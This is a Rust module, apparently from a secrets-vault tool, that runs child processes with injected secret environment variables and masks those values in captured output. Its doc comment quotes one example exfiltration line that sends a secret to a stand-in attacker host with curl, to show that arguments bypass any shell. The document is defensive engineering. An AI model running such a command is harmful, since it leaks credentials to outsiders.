//! The injector: the only code that materializes plaintext outside the vault.
//!
//! Two things live here: running a child process with extra environment variables (the core of
//! the CLI's `kagisecure run` and of the MCP `run_with_env` tool, mcp-server.md §2.8), and
//! writing a `.env` file ([`envfile`], mcp-server.md §2.7).
//!
//! Two rules from that spec are load-bearing and are enforced here rather than by convention:
//!
//! 1. **No shell.** The program and its arguments go to the OS directly. There is no code path in
//!    this module that builds a command string, so `; curl evil.com?$SECRET` in an argument is
//!    just an argument.
//! 2. **Masking is best effort and is not a security boundary.** [`mask`] is a substring
//!    replacement over a fixed set of needles: the injected value itself (ASCII case-insensitive)
//!    and a few encodings a program applies without meaning to leak anything — standard base64,
//!    hex in either case, and percent-encoding. A truncated stream is additionally trimmed of any
//!    fragment at the cut that begins one of those needles, so the output cap cannot hand back
//!    half a secret.
//!
//!    What it does **not** catch, and cannot: a value that is reversed, split across lines or
//!    fields, interleaved with separators, re-chunked so no contiguous run survives, compressed,
//!    encrypted, hashed, re-encoded in any alphabet not listed above, or printed one character
//!    per line. Deciding whether an arbitrary output encodes a given value is not decidable, and
//!    a command that wants to exfiltrate an injected value always can. Masking guards against
//!    accidental echo — a stack trace printing a connection string — not against a hostile
//!    command. The defence against a hostile command is not running it.

pub mod envfile;

use std::ffi::{OsStr, OsString};
use std::io::Read;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

pub use kagisecure_childproc::{ChildKillHandle, Spawned};

use crate::error::{Error, Result};
use crate::model::Secret;
use crate::proto::VarName;

/// Default per-stream capture cap, matching mcp-server.md §2.8.
pub const DEFAULT_MAX_OUTPUT: usize = 64 * 1024;

/// How often the wait loop checks on a child that has a deadline.
const POLL_INTERVAL: Duration = Duration::from_millis(20);

/// Between `SIGTERM` and `SIGKILL` when a call with a deadline ends its child's process group
/// itself — at the deadline, or when the command exits leaving processes behind in its group.
/// Long enough for a well-behaved program's own `SIGTERM` handler to run; short enough that the
/// call still returns promptly. (Windows has no soft stop for an arbitrary process; the job is
/// terminated at once there.)
pub const KILL_GRACE: Duration = Duration::from_secs(2);

/// How long output is still read, once the whole process group has been killed, from a pipe that
/// something outside the group — a process that deliberately left it — still holds open. After
/// this the call returns with what it has, and marks that stream truncated.
pub const OUTPUT_GRACE: Duration = Duration::from_millis(500);

/// One variable to place in the child's environment.
pub struct EnvInjection {
    /// Variable name. Metadata: it may be shown, logged and returned to an agent.
    ///
    /// A [`VarName`], not a `String`: it is rendered verbatim as a `.env` key and an environment
    /// block key, where a `=` or a newline would become part of the syntax.
    pub name: VarName,
    /// Variable value. Never shown, never logged.
    pub value: Secret,
}

impl std::fmt::Debug for EnvInjection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("EnvInjection")
            .field("name", &self.name)
            .field("value", &self.value)
            .finish()
    }
}

/// What to run and with what.
pub struct RunRequest<'a> {
    /// Executable. **Not** a shell string.
    pub program: &'a OsStr,
    /// Arguments, passed to the OS verbatim.
    pub args: &'a [OsString],
    /// Variables to add to the inherited environment.
    pub env: &'a [EnvInjection],
    /// Working directory for the child; the parent's if `None`.
    pub cwd: Option<&'a Path>,
    /// Replace injected values in the captured output with `[kagisecure:redacted:NAME]`.
    pub mask_output: bool,
    /// Per-stream cap on captured bytes.
    pub max_output: usize,
    /// Wall-clock limit. `None` waits forever, which is what the CLI's own `run` does.
    ///
    /// A deadline also makes the call *bounded*: when it passes, or when the command exits
    /// first, whatever is left in the child's process group is ended (`SIGTERM`, then `SIGKILL`
    /// after [`KILL_GRACE`]), and output is read for at most [`OUTPUT_GRACE`] more — so the call
    /// returns within the deadline plus those two, and nothing the command started in its group
    /// keeps running with the injected value once it has. Without a deadline the call waits for
    /// the command, and for every holder of its output pipes, as a shell's `$(…)` does.
    pub timeout: Option<Duration>,
    /// Start the child as the leader of a process group of its own (Unix).
    ///
    /// The MCP agent wants this: a vault lock or a deadline then ends the command *and* whatever
    /// it spawned, and never the agent's own group. A terminal wrapper must not: the terminal
    /// delivers Ctrl-C, Ctrl-\ and the hang-up of a closed window to its foreground process group,
    /// and a child moved out of that group would miss them — `kagisecure run` would die on Ctrl-C
    /// and leave the child running, detached, with the secret in its environment. Keeping the
    /// child in the caller's group gives it exactly the signals a command typed at the prompt
    /// would get, with nothing to forward (forwarding would need handlers for every job-control
    /// signal and still lose to a `SIGKILL` of the wrapper). Off by default, so a new caller gets
    /// the terminal behaviour unless it opts in. On Windows every child gets a job object either
    /// way; that does not change console Ctrl-C delivery.
    pub new_process_group: bool,
}

impl<'a> RunRequest<'a> {
    /// A request with masking on and the default output cap.
    #[must_use]
    pub fn new(program: &'a OsStr, args: &'a [OsString], env: &'a [EnvInjection]) -> Self {
        Self {
            program,
            args,
            env,
            cwd: None,
            mask_output: true,
            max_output: DEFAULT_MAX_OUTPUT,
            timeout: None,
            new_process_group: false,
        }
    }
}

/// The result of running a child.
#[derive(Debug, Default)]
pub struct RunOutcome {
    /// Exit status, or `None` if the child was killed by a signal.
    pub exit_code: Option<i32>,
    /// Captured stdout, masked if requested and truncated to the cap.
    pub stdout: Vec<u8>,
    /// Captured stderr, masked if requested and truncated to the cap.
    pub stderr: Vec<u8>,
    /// Whether stdout hit the cap.
    pub stdout_truncated: bool,
    /// Whether stderr hit the cap.
    pub stderr_truncated: bool,
    /// How many injected values were replaced across both streams.
    pub masked: usize,
    /// Whether the child was killed for exceeding [`RunRequest::timeout`].
    pub timed_out: bool,
}

/// Run `request.program` with the injected environment and capture its output.
///
/// # Errors
///
/// [`Error::NonUtf8EnvValue`] if a value cannot be represented as an environment value, and
/// [`Error::Spawn`] if the program could not be started. Neither error carries a value.
pub fn run_with_env(request: &RunRequest<'_>) -> Result<RunOutcome> {
    run_with_env_tracked(request, |_handle| {})
}

/// As [`run_with_env`], but calls `on_spawn` with a [`ChildKillHandle`] the instant the child
/// exists — before draining its pipes or waiting on it — so a caller can register it somewhere
/// that outlives this call.
///
/// `kagisecure-agent`'s own tracking of children started under an injected environment is exactly
/// this: `docs/mcp-server.md`'s "lock ends what an approval started" needs a way to end a
/// `run_with_env` child from the thread that locks the vault, which is never the thread blocked in
/// this function's own wait loop below.
///
/// # Errors
///
/// As [`run_with_env`].
pub fn run_with_env_tracked(
    request: &RunRequest<'_>,
    on_spawn: impl FnOnce(ChildKillHandle),
) -> Result<RunOutcome> {
    let mut command = Command::new(request.program);
    command.args(request.args);
    command.stdin(Stdio::null());
    command.stdout(Stdio::piped());
    command.stderr(Stdio::piped());
    if let Some(dir) = request.cwd {
        command.current_dir(dir);
    }
    for injection in request.env {
        command.env(injection.name.as_str(), env_value(injection)?);
    }

    // `Spawned` owns the child *and* what a kill acts on (on Windows the job object, whose last
    // close kills the child), so neither goes away until `wait_for` below has reaped it — however
    // many or few kill handles `on_spawn` keeps.
    let mut spawned =
        Spawned::spawn(&mut command, request.new_process_group).map_err(|e| Error::Spawn {
            program: request.program.to_string_lossy().into_owned(),
            reason: e.to_string(),
        })?;
    // Before anything else, including draining the pipes below: the window between `spawn` and
    // this call is exactly when a lock arriving would otherwise see no tracked child at all.
    on_spawn(spawned.kill_handle());

    // Both pipes are drained on their own threads. Reading them in sequence would deadlock the
    // moment a child fills the other pipe's buffer, which is exactly what a chatty build does.
    let cap = request.max_output;
    let out_handle = spawned
        .child_mut()
        .stdout
        .take()
        .map(|pipe| drain(pipe, cap));
    let err_handle = spawned
        .child_mut()
        .stderr
        .take()
        .map(|pipe| drain(pipe, cap));

    let captures = [out_handle.as_ref(), err_handle.as_ref()];
    let (status, timed_out) = match request.timeout {
        None => (spawned.reap()?, false),
        Some(limit) => end_group_bounded(spawned, limit, &captures)?,
    };
    // Bounded only when the call is: a pipe still open now is held by something outside the
    // group, which the call does not wait for — see `RunRequest::timeout`.
    let output_deadline = request.timeout.map(|_| Instant::now() + OUTPUT_GRACE);

    let (mut stdout, stdout_truncated) =
        out_handle.map_or_else(|| (Vec::new(), false), |c| c.finish(output_deadline));
    let (mut stderr, stderr_truncated) =
        err_handle.map_or_else(|| (Vec::new(), false), |c| c.finish(output_deadline));

    let mut masked = 0;
    if request.mask_output {
        masked += mask(&mut stdout, request.env);
        masked += mask(&mut stderr, request.env);
        // The cap can cut a value in half, and half a value is invisible to an exact-substring
        // scrubber. Anything at the cut that begins a secret goes.
        if stdout_truncated {
            trim_partial_tail(&mut stdout, request.env);
        }
        if stderr_truncated {
            trim_partial_tail(&mut stderr, request.env);
        }
    }

    Ok(RunOutcome {
        exit_code: if timed_out { None } else { status.code() },
        stdout,
        stderr,
        stdout_truncated,
        stderr_truncated,
        masked,
        timed_out,
    })
}

/// What a draining thread has read so far, shared with the caller so a bounded call can take it
/// without waiting for the thread.
#[derive(Default)]
struct Captured {
    buf: Vec<u8>,
    truncated: bool,
    /// Set by the caller when it stops waiting: the thread keeps nothing more.
    abandoned: bool,
    /// Set by the thread when the pipe reached end of file (or failed).
    finished: bool,
}

/// One pipe being read to the cap on a thread of its own.
struct Capture {
    state: std::sync::Arc<(std::sync::Mutex<Captured>, std::sync::Condvar)>,
    thread: std::thread::JoinHandle<()>,
}

impl Capture {
    fn lock(&self) -> std::sync::MutexGuard<'_, Captured> {
        self.state
            .0
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
    }

    /// Wait until the pipe has reached end of file, or `deadline` passes. Whether it finished.
    fn wait_finished(&self, deadline: Option<Instant>) -> bool {
        let mut state = self.lock();
        loop {
            if state.finished {
                return true;
            }
            match deadline {
                None => {
                    state = self
                        .state
                        .1
                        .wait(state)
                        .unwrap_or_else(std::sync::PoisonError::into_inner);
                }
                Some(deadline) => {
                    let now = Instant::now();
                    if now >= deadline {
                        return false;
                    }
                    state = self
                        .state
                        .1
                        .wait_timeout(state, deadline - now)
                        .unwrap_or_else(std::sync::PoisonError::into_inner)
                        .0;
                }
            }
        }
    }

    /// Everything read, and whether it is incomplete: cut at the cap, or — when `deadline`
    /// passed with the pipe still open — cut wherever reading stopped. Either way the caller
    /// treats it as truncated, which is what makes masking trim a partial value at the cut.
    fn finish(self, deadline: Option<Instant>) -> (Vec<u8>, bool) {
        if self.wait_finished(deadline) {
            let mut state = self.lock();
            let out = (std::mem::take(&mut state.buf), state.truncated);
            drop(state);
            let _ = self.thread.join();
            return out;
        }
        // Held open by something outside the group. The thread is left blocked in its read —
        // it ends when that holder does — and keeps nothing more from here on.
        let mut state = self.lock();
        state.abandoned = true;
        (std::mem::take(&mut state.buf), true)
    }
}

/// Read a pipe to the cap on its own thread.
fn drain<R: Read + Send + 'static>(mut pipe: R, cap: usize) -> Capture {
    let state = std::sync::Arc::new((
        std::sync::Mutex::new(Captured::default()),
        std::sync::Condvar::new(),
    ));
    let shared = std::sync::Arc::clone(&state);
    let thread = std::thread::spawn(move || {
        let lock = || {
            shared
                .0
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
        };
        let mut chunk = [0u8; 8192];
        loop {
            let n = match pipe.read(&mut chunk) {
                Ok(0) | Err(_) => break,
                Ok(n) => n,
            };
            let mut state = lock();
            if state.abandoned {
                break;
            }
            let room = cap.saturating_sub(state.buf.len());
            if n > room {
                state.buf.extend_from_slice(&chunk[..room]);
                state.truncated = true;
            } else {
                state.buf.extend_from_slice(&chunk[..n]);
            }
        }
        lock().finished = true;
        shared.1.notify_all();
    });
    Capture { state, thread }
}

/// Wait for a child that has a deadline, then end whatever is left of its process group, and
/// reap it. Returns the exit status and whether the deadline was what ended it.
///
/// The child is only ever *observed* exiting here ([`Spawned::has_exited`] does not reap), so its
/// pid — and the process-group id it leads — stay its own until the group has been signalled for
/// the last time and [`Spawned::reap`] runs at the end: nothing here can signal a stranger.
///
/// * **Deadline passed:** `SIGTERM` to the group, up to [`KILL_GRACE`] for the child to exit, then
///   `SIGKILL` to the group.
/// * **The child exited first:** the command is over, but anything it started in its group is
///   still running with the injected value — and, if it inherited the output pipes, holding the
///   readers open. It is ended the same way: `SIGTERM` to the group, up to [`KILL_GRACE`] for the
///   pipes to close (a group with nothing left in it closes them at once, so the common case costs
///   nothing), then `SIGKILL`. Ending the group rather than tracking it until it empties keeps
///   the promise a lock relies on: once this call returns, the lock has nothing left to find.
fn end_group_bounded(
    mut spawned: Spawned,
    limit: Duration,
    captures: &[Option<&Capture>],
) -> Result<(std::process::ExitStatus, bool)> {
    let deadline = Instant::now() + limit;
    let exited = wait_until(&mut spawned, deadline)?;
    spawned.terminate();
    let grace = Instant::now() + KILL_GRACE;
    if exited {
        for capture in captures.iter().flatten() {
            let _ = capture.wait_finished(Some(grace));
        }
    } else {
        let _ = wait_until(&mut spawned, grace)?;
    }
    spawned.kill();
    Ok((spawned.reap()?, !exited))
}

/// Poll until the child has exited (without reaping it) or `deadline` passes. Whether it exited.
fn wait_until(spawned: &mut Spawned, deadline: Instant) -> Result<bool> {
    loop {
        if spawned.has_exited()? {
            return Ok(true);
        }
        let now = Instant::now();
        if now >= deadline {
            return Ok(false);
        }
        std::thread::sleep(POLL_INTERVAL.min(deadline - now));
    }
}

#[cfg(unix)]
fn env_value(injection: &EnvInjection) -> Result<OsString> {
    use std::os::unix::ffi::OsStrExt;
    if injection.value.expose().contains(&0) {
        return Err(Error::NonUtf8EnvValue(injection.name.to_string()));
    }
    Ok(OsStr::from_bytes(injection.value.expose()).to_owned())
}

#[cfg(not(unix))]
fn env_value(injection: &EnvInjection) -> Result<OsString> {
    injection
        .value
        .expose_str()
        .filter(|s| !s.contains('\0'))
        .map(OsString::from)
        .ok_or_else(|| Error::NonUtf8EnvValue(injection.name.to_string()))
}

/// Set each of `env` in `command`'s environment, as [`run_with_env`] does for the program it
/// starts: for a caller that spawns and tracks the process itself (the unattended engine starting
/// a job's own program with its granted environment, ADR-0042 implementation decision 51).
///
/// # Errors
///
/// [`Error::NonUtf8EnvValue`] for a value the platform's environment block cannot carry; nothing
/// is set for it or after it.
pub fn set_env(command: &mut Command, env: &[EnvInjection]) -> Result<()> {
    for injection in env {
        command.env(injection.name.as_str(), env_value(injection)?);
    }
    Ok(())
}

/// Replace every occurrence of an injected value with `[kagisecure:redacted:NAME]`, returning the
/// number of replacements.
///
/// Longer values are replaced first, so that a secret which happens to contain another secret as a
/// prefix does not leave the remainder visible. Empty values are skipped — replacing the empty
/// string everywhere would destroy the output and protect nothing.
///
/// **This is not a security boundary.** See the module documentation.
#[must_use]
pub fn mask(buf: &mut Vec<u8>, injections: &[EnvInjection]) -> usize {
    let mut needles = needles(injections);
    needles.sort_by_key(|n| std::cmp::Reverse(n.bytes.len()));

    let mut count = 0;
    for needle in &needles {
        let replacement = format!("[kagisecure:redacted:{}]", needle.name).into_bytes();
        let mut out: Vec<u8> = Vec::with_capacity(buf.len());
        let mut i = 0;
        while i < buf.len() {
            if needle.matches_at(buf, i) {
                out.extend_from_slice(&replacement);
                i += needle.bytes.len();
                count += 1;
            } else {
                out.push(buf[i]);
                i += 1;
            }
        }
        *buf = out;
    }
    count
}

/// One byte string that [`mask`] looks for, and how to compare it.
struct Needle {
    /// The variable name this needle belongs to, for the replacement marker.
    name: String,
    bytes: Vec<u8>,
    /// Whether ASCII case is ignored. Only the raw value is matched case-insensitively; the
    /// derived encodings are matched exactly, since their case carries meaning.
    fold_case: bool,
}

impl Needle {
    fn matches_at(&self, buf: &[u8], at: usize) -> bool {
        let Some(window) = buf.get(at..at + self.bytes.len()) else {
            return false;
        };
        if self.fold_case {
            window.eq_ignore_ascii_case(&self.bytes)
        } else {
            window == self.bytes
        }
    }

    /// The length of the longest proper prefix of this needle that `buf` ends with, or 0.
    fn trailing_prefix_len(&self, buf: &[u8]) -> usize {
        (1..self.bytes.len())
            .rev()
            .find(|k| {
                buf.len() >= *k && {
                    let tail = &buf[buf.len() - k..];
                    if self.fold_case {
                        tail.eq_ignore_ascii_case(&self.bytes[..*k])
                    } else {
                        tail == &self.bytes[..*k]
                    }
                }
            })
            .unwrap_or(0)
    }
}

/// Every byte string [`mask`] searches for: each injected value, plus the handful of encodings a
/// program applies to a value without meaning to leak it (a JSON or URL quoter, a base64 or hex
/// dump in a log line).
///
/// This widens the net; it does not make masking sound. A value that is reversed, split across
/// lines, compressed, encrypted or printed one character at a time still walks straight past
/// every needle here, and no finite needle set can change that. See the module documentation.
fn needles(injections: &[EnvInjection]) -> Vec<Needle> {
    let mut out = Vec::new();
    for injection in injections.iter().filter(|i| !i.value.is_empty()) {
        let value = injection.value.expose();
        let mut push = |bytes: Vec<u8>, fold_case: bool| {
            if !bytes.is_empty() && !out.iter().any(|n: &Needle| n.bytes == bytes) {
                out.push(Needle {
                    name: injection.name.to_string(),
                    bytes,
                    fold_case,
                });
            }
        };
        push(value.to_vec(), true);
        push(base64_standard(value).into_bytes(), false);
        push(hex(value, false).into_bytes(), false);
        push(hex(value, true).into_bytes(), false);
        push(percent_encoded(value).into_bytes(), false);
    }
    out
}

/// Standard, padded Base64 of `bytes`.
fn base64_standard(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
        let indices = [n >> 18, (n >> 12) & 0x3f, (n >> 6) & 0x3f, n & 0x3f];
        for (i, index) in indices.iter().enumerate() {
            if i <= chunk.len() {
                out.push(char::from(ALPHABET[*index as usize]));
            } else {
                out.push('=');
            }
        }
    }
    out
}

/// Hex of `bytes`, upper or lower case.
fn hex(bytes: &[u8], upper: bool) -> String {
    bytes
        .iter()
        .map(|b| {
            if upper {
                format!("{b:02X}")
            } else {
                format!("{b:02x}")
            }
        })
        .collect()
}

/// Percent-encoding of `bytes`, escaping everything outside the unreserved set.
fn percent_encoded(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len());
    for byte in bytes {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~') {
            out.push(char::from(*byte));
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    out
}

/// Drop a partial occurrence of a secret left at the end of a *truncated* buffer.
///
/// The output cap cuts a stream at an arbitrary byte, which can land in the middle of a value.
/// The fragment that survives is no longer the whole needle, so [`mask`] does not see it — and
/// half an API key is still a leak. Only a truncated buffer is trimmed: at the natural end of a
/// stream, a tail that happens to look like the start of a secret is the program's own output.
fn trim_partial_tail(buf: &mut Vec<u8>, injections: &[EnvInjection]) {
    let drop = needles(injections)
        .iter()
        .map(|n| n.trailing_prefix_len(buf))
        .max()
        .unwrap_or(0);
    buf.truncate(buf.len() - drop);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn injection(name: &str, value: &str) -> EnvInjection {
        EnvInjection {
            name: VarName::new(name).expect("a test name is a valid name"),
            value: Secret::from_string(value.to_owned()),
        }
    }

    #[test]
    fn masks_exact_values() {
        let mut buf = b"connecting with sk_live_abcdef now".to_vec();
        let n = mask(&mut buf, &[injection("STRIPE_KEY", "sk_live_abcdef")]);
        assert_eq!(n, 1);
        assert_eq!(
            String::from_utf8(buf).unwrap(),
            "connecting with [kagisecure:redacted:STRIPE_KEY] now"
        );
    }

    #[test]
    fn masks_every_occurrence_and_counts_them() {
        let mut buf = b"aaa bbb aaa".to_vec();
        assert_eq!(mask(&mut buf, &[injection("A", "aaa")]), 2);
        assert!(!String::from_utf8(buf).unwrap().contains("aaa"));
    }

    #[test]
    fn masks_the_longer_value_first() {
        let mut buf = b"token=abcdef".to_vec();
        let _ = mask(
            &mut buf,
            &[injection("SHORT", "abc"), injection("LONG", "abcdef")],
        );
        assert_eq!(
            String::from_utf8(buf).unwrap(),
            "token=[kagisecure:redacted:LONG]"
        );
    }

    #[test]
    fn empty_values_are_not_masked() {
        let mut buf = b"unchanged".to_vec();
        assert_eq!(mask(&mut buf, &[injection("EMPTY", "")]), 0);
        assert_eq!(buf, b"unchanged");
    }

    #[test]
    fn masks_binary_output_too() {
        let mut buf = b"\x00\x01secret\xff".to_vec();
        assert_eq!(mask(&mut buf, &[injection("S", "secret")]), 1);
        assert!(!buf.windows(6).any(|w| w == b"secret"));
    }

    #[test]
    fn debug_of_an_injection_hides_the_value() {
        let rendered = format!("{:?}", injection("K", "hunter2"));
        assert!(rendered.contains('K'));
        assert!(!rendered.contains("hunter2"));
    }

    #[test]
    fn masking_ignores_ascii_case_in_the_value() {
        let mut buf = b"TOKEN=SK_LIVE_ABCDEF".to_vec();
        assert_eq!(mask(&mut buf, &[injection("K", "sk_live_abcdef")]), 1);
        assert_eq!(
            String::from_utf8(buf).unwrap(),
            "TOKEN=[kagisecure:redacted:K]"
        );
    }

    #[test]
    fn masking_covers_base64_hex_and_percent_encodings_of_the_value() {
        for encoded in ["c2VjcmV0", "736563726574"] {
            let mut buf = format!("v={encoded}").into_bytes();
            assert_eq!(mask(&mut buf, &[injection("S", "secret")]), 1, "{encoded}");
        }
        for encoded in ["7a7a", "7A7A"] {
            let mut buf = format!("v={encoded}").into_bytes();
            assert_eq!(mask(&mut buf, &[injection("S", "zz")]), 1, "{encoded}");
        }
        let mut buf = b"v=a%20b".to_vec();
        assert_eq!(mask(&mut buf, &[injection("S", "a b")]), 1);
    }

    #[test]
    fn a_partial_value_at_a_truncation_point_is_trimmed_away() {
        let mut buf = b"xxxxsk_live".to_vec();
        trim_partial_tail(&mut buf, &[injection("K", "sk_live_abcdef")]);
        assert_eq!(buf, b"xxxx");

        // Nothing that starts a secret: untouched.
        let mut buf = b"all clear".to_vec();
        trim_partial_tail(&mut buf, &[injection("K", "sk_live_abcdef")]);
        assert_eq!(buf, b"all clear");
    }

    #[test]
    fn a_draining_thread_stops_at_the_cap_and_says_so() {
        let (buf, truncated) = drain(std::io::Cursor::new(vec![b'x'; 10]), 4).finish(None);
        assert_eq!(buf, b"xxxx");
        assert!(truncated);

        let (buf, truncated) = drain(std::io::Cursor::new(vec![b'x'; 3]), 4).finish(None);
        assert_eq!(buf, b"xxx");
        assert!(!truncated);
    }

    /// A reader that yields some bytes and then blocks forever, like a pipe whose other end is
    /// held by a process outside the group.
    struct Stalls(Option<Vec<u8>>);

    impl Read for Stalls {
        fn read(&mut self, out: &mut [u8]) -> std::io::Result<usize> {
            if let Some(bytes) = self.0.take() {
                out[..bytes.len()].copy_from_slice(&bytes);
                return Ok(bytes.len());
            }
            std::thread::sleep(Duration::from_secs(3600));
            Ok(0)
        }
    }

    #[test]
    fn a_pipe_held_open_is_given_up_on_at_the_deadline_and_marked_truncated() {
        let capture = drain(Stalls(Some(b"partial".to_vec())), 1024);
        std::thread::sleep(Duration::from_millis(100));
        let started = Instant::now();
        let (buf, truncated) = capture.finish(Some(Instant::now() + Duration::from_millis(100)));
        assert!(started.elapsed() < Duration::from_secs(2));
        assert_eq!(buf, b"partial");
        assert!(truncated, "an abandoned stream may have been cut mid-value");
    }
}
